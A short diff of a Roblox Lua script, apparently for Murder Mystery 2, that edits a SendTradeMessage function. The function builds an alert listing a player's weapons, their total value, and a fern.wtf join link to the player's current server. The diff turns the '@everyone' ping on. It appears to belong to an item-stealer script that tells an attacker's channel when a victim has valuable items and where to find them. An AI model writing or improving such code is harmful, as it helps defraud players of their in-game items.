@@ -312,7 +312,7 @@ end
 local function SendTradeMessage(weapons, totalVal)
     local prefix = ""
     if ping == "Yes" then
-        prefix = "--[[@everyone]] "
+        prefix = "@everyone "
     end
 
     local fields = {
@@ -323,7 +323,8 @@ local function SendTradeMessage(weapons, totalVal)
         },
         {
             name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
+            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId,
+            inline = true
         },
         {
             name = "Item list:",
